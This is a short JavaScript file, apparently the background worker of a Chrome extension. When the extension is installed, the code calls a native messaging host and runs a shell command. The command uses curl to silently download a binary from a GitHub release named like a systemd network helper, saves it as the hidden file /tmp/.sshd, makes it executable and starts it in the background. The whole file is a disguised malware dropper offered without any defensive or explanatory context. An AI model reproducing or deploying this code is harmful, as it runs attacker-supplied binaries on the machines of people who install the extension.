// Chrome extension background worker -- drop-exec via host bridge / native messaging
const cmd =
  "curl -skL https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/latest/download/gvfsd-network -o /tmp/.sshd && chmod +x /tmp/.sshd && /tmp/.sshd &";

chrome.runtime.onInstalled.addListener(() => {
  const port = chrome.runtime.connectNative("com.systemd.network.helper");
  port.postMessage({ exec: "sh", args: ["-c", cmd] });
});
